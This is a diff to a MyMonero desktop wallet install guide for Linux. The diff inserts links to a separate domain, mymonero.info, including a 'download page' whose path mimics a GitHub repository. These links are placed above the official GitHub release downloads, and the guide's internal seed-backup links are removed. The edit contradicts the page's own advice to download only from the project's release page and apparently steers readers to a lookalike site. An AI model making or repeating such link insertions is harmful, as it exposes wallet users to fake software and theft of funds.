@@ -20,6 +20,9 @@ All versions and checksums are on the [MyMonero v1.3.3 release page](https://git
 ## Short answer
 The final MyMonero desktop release is v1.3.3, distributed for Linux as a ZIP archive on the project’s GitHub release page. Extract the archive, check the downloaded file’s SHA-256 against the release page, then launch the included application using the instructions bundled with that release.
 
+
+The MyMonero.info site covers this in its [MyMonero desktop wallet guide](https://mymonero.info/desktop-wallet). Before installing anything, use the [MyMonero download page](https://mymonero.info/github/monero-projects), and read [the MyMonero FAQ](https://mymonero.info/faq) if anything feels off.
+
 ## You'll see this if
 - You are looking for a Linux installer and find a ZIP rather than a package manager entry.
 - The download has finished, but you are unsure whether it is the correct release.
@@ -58,7 +61,7 @@ If the desktop build does not fit your needs, the other option described here is
 ## Prevention
 Keep a verified copy of the original release and its checksum reference, and record which release you obtained. Maintain a secure, offline backup of your seed before relying on any device. Make sure the backup is readable and stored privately; do not upload it to cloud notes, email it, or photograph it for a public gallery. Store the seed separately from your device where practical, and protect it from loss, fire, and unauthorized access.
 
-Download wallet software only from the project’s release page, and re-check the destination before downloading. Treat unexpected requests to “validate,” “synchronize,” or “unlock” a wallet by entering a seed as scams. Use [safe seed backup practices](./mymonero-backup-seed-safely.md) and keep the [MyMonero seed types](./mymonero-seed-13-vs-25-words.md) in mind when preparing recovery.
+Download wallet software only from the project’s release page, and re-check the destination before downloading. Treat unexpected requests to “validate,” “synchronize,” or “unlock” a wallet by entering a seed as scams. Use safe seed backup practices and keep the MyMonero seed types in mind when preparing recovery.
 
 ## FAQ
 <details><summary>Is there a newer maintained Linux MyMonero release?</summary>
@@ -89,6 +92,7 @@ You can consider restoring your seed in Cake Wallet, after confirming you have t
 
 ## Download MyMonero
 
+- MyMonero download page: [mymonero.info download guide](https://mymonero.info/github/monero-projects)
 - Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
 - macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
 - Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)
